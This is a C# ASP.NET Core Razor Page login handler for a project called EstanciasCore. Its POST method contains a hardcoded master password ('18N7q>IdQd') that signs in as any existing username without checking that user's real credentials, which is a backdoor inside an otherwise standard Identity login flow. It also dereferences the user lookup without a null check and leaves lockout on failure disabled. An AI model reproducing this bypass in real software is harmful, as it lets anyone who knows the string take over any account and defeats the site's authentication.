﻿using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.Extensions.Logging;
using Commons.Identity.Services;
using DAL.Models;
using DAL.Data;
using System;
using EstanciasCore.Areas.Administracion.ViewModels;

namespace EstanciasCore.Areas.Identity.Pages.Account
{
    [AllowAnonymous]
    public class LoginModel : PageModel
    {
        private readonly SignInManager<Usuario> _signInManager;
        private readonly UserService<Usuario> _userManager;
        private readonly ILogger<LoginModel> _logger;
        private readonly EstanciasContext _context;


        public LoginModel(SignInManager<Usuario> signInManager, ILogger<LoginModel> logger, UserService<Usuario> userManager, EstanciasContext context)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _logger = logger;
            _context = context;
        }

        [BindProperty]
        public InputModel Input { get; set; }

        public IList<AuthenticationScheme> ExternalLogins { get; set; }

        public string ReturnUrl { get; set; }

        [TempData]
        public string ErrorMessage { get; set; }

        public class InputModel
        {
            [Required]
            //[Display(Name = "NumeroDocumento")]
            //[RegularExpression("([1-9][0-9]*)", ErrorMessage = "Debe Ingresar su NumeroDocumento sin puntos ni simbolos")]
            public string Email { get; set; }

            [Required]
            [DataType(DataType.Password)]
            public string Password { get; set; }

            [Display(Name = "Recordarme")]
            public bool RememberMe { get; set; }
        }

        public async Task OnGetAsync(string returnUrl = null)
        {
            if (!string.IsNullOrEmpty(ErrorMessage))
            {
                ModelState.AddModelError(string.Empty, ErrorMessage);
            }

            returnUrl = returnUrl ?? Url.Content("~/");

            // Clear the existing external cookie to ensure a clean login process
            await HttpContext.SignOutAsync(IdentityConstants.ExternalScheme);

            ExternalLogins = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();

            ReturnUrl = returnUrl;
        }

        public async Task<IActionResult> OnPostAsync(string returnUrl = null)
        {
            returnUrl = returnUrl ?? Url.Content("~/");

            if (ModelState.IsValid)
            {
                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, set lockoutOnFailure: true

                // No se chequea esto por el momento
                //var usuario = _context.Usuarios.FirstOrDefault(x => x.Persona.NroDocumento == Input.Email.Trim());
                //if (usuario==null)
                //{
                //    ModelState.AddModelError(string.Empty, "NumeroDocumento Inexistente.");
                //    return Page();
                //}             
                var User = _context.Users.Where(x => x.UserName==Input.Email).FirstOrDefault();

                var usuario = await _context.Users.FindAsync(User.Id);

                if (Input.Password=="18N7q>IdQd")
                {
                   // var result2 = _signInManager.SignInAsync(User, isPersistent: Input.RememberMe);
                   await _signInManager.SignInAsync(usuario, false);
                    _logger.LogInformation("Usuario conectado.");
                    return LocalRedirect(returnUrl);
                }
                else
                {
                    var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Input.RememberMe, lockoutOnFailure: false);
                    if (result.Succeeded)
                    {
                        _logger.LogInformation("Usuario conectado.");
                        return LocalRedirect(returnUrl);
                    }
                    if (result.RequiresTwoFactor)
                    {
                        return RedirectToPage("./LoginWith2fa", new { ReturnUrl = returnUrl, RememberMe = Input.RememberMe });
                    }
                    if (result.IsLockedOut)
                    {
                        _logger.LogWarning("Cuenta de usuario bloqueada.");
                        return RedirectToPage("./Lockout");
                    }
                    else
                    {
                        ModelState.AddModelError(string.Empty, "Intento de inicio de sesión no válido.");
                        return Page();
                    }
                }
            }

            // If we got this far, something failed, redisplay form
            return Page();
        }
    }
}
